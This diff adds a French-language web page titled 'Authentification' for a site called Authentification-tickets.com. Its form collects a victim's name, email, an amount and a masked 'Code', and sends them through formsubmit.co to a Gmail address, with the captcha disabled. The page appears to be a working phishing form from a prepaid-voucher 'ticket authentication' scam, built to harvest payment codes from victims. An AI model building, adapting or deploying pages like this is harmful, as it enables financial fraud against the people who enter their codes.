@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authentification</title>
+  <link rel="stylesheet" href="form.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="index.html">Accueil</a>
+      <a href="#galerie">Galerie</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <div>
+      <div class="custom-language-selector">
+        <div class="selected-lang" onclick="toggleLangMenu()">
+          <img src="https://flagcdn.com/w20/fr.png" alt="FR">
+          <span>Français</span>
+        </div>
+        <ul class="lang-options">
+          <li onclick="setLang('fr')">
+            <img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français
+          </li>
+          <li onclick="setLang('en')">
+            <img src="https://flagcdn.com/w20/gb.png" alt="EN"> English
+          </li>
+          <li onclick="setLang('es')">
+            <img src="https://flagcdn.com/w20/es.png" alt="ES"> Español
+          </li>
+          <li onclick="setLang('de')">
+            <img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch
+          </li>
+          <li onclick="setLang('it')">
+            <img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano
+          </li>
+          <li onclick="setLang('pt')">
+            <img src="https://flagcdn.com/w20/pt.png" alt="PT"> Português
+          </li>
+        </ul>
+      </div>
+    </div>
+  </header>
+
+  <div class="page-wrapper">
+    <section id="contact" class="contact-section">
+      <div class="container">
+        <h2 class="section-title" data-i18n="contact_title"></h2>
+        <form action="https://formsubmit.co/authentificationtickets811@gmail.com" method="POST" class="contact-form">
+          <div class="form-group">
+            <label for="nom" class="label-nom">Nom :</label>
+            <input type="text" id="nom" name="nom" required placeholder="" class="input-nom">
+          </div>
+
+          <div class="form-group">
+            <label for="prenom" class="label-prenom">Prénom :</label>
+            <input type="text" id="prenom" name="prenom" required placeholder="" class="input-prenom">
+          </div>
+
+          <div class="form-group">
+            <label for="amount" class="label-amount">Montant :</label>
+            <input type="number" id="amount" name="amount" min="1" required placeholder="" class="input-amount">
+          </div>
+
+          <div class="form-group">
+            <label for="email" class="label-email">Votre email :</label>
+            <input type="email" id="email" name="email" required placeholder="" class="input-email">
+          </div>
+
+          <div class="form-group">
+            <label for="code" class="label-code">Code :</label>
+            <div class="password-wrapper">
+              <input type="password" id="code" name="code" required placeholder="" class="input-code">
+              <i class="fa-solid fa-eye toggle-password" onclick="togglePasswordVisibility()"></i>
+            </div>
+          </div>
+
+
+          <input type="hidden" name="_next" value="https://authentification-tickets.com/merci.html">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_template" value="table">
+          <button type="submit" class="submit-button">Envoyer</button>
+        </form>
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-links">
+        <a href="#galerie" data-i18n="footer_galerie">Galerie</a>
+        <a href="#faq" data-i18n="footer_faq">FAQ</a>
+        <a href="#contact" data-i18n="footer_contact">Contact</a>
+      </div>
+      <p data-i18n="footer_copyright">&copy; 2025 Authentification-tickets.com Tous droits réservés.</p>
+    </div>
+  </footer>
+
+  <script src="form.js"></script>
+</body>
+</html>
